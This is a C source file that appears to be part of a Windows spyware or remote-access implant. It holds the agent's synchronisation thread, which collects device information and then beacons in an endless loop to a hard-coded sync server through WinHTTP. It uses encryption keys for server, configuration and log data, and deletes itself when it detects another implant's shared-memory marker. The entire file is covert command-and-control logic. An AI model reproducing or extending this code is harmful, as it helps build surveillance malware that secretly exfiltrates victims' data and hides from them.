#include <Windows.h>

#include "main.h"
#include "sync_thread.h"
#include "binpatched_vars.h"
#include "agent_device.h"
#include "log_files.h"
#include "win_http.h"
#include "md5.h"
#include "proto.h"
#include "crypt.h"
//#include "ComHTTP.h"

typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern BOOL bLastSync;

BOOL bFirstShot = TRUE;


VOID SyncThreadFunction()
{
	ULONG pServerPort;
	BYTE pServerIp[32];
	
	//call the CoInitializeEx here instead of calling it in the main funcion (it returned an error)
	if(CoInitializeEx(0, COINIT_MULTITHREADED) == S_OK)
		CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE,NULL);

	//get info about the system
	GetDeviceInfo();

	while(1)
	{
		if (ExistsEliteSharedMemory())
		{
			DeleteAndDie(TRUE);
			break;
		}
#ifdef _DEBUG
		OutputDebugString(L"[*] Starting sync...\n");
#endif

		if (WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort))
		{
			bLastSync = SyncWithServer();

#ifdef _DEBUG
			if (!bLastSync)
				OutputDebugString(L"[!!] Sync FAILED\n");
#endif
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"WinHTTPSetup FAIL\n");
#endif
			bLastSync = FALSE;
		}

		WinHTTPClose();
		
		if (bLastSync)
			MySleep(WAIT_SUCCESS_SYNC);
		else
			MySleep(WAIT_FAIL_SYNC);
	}
}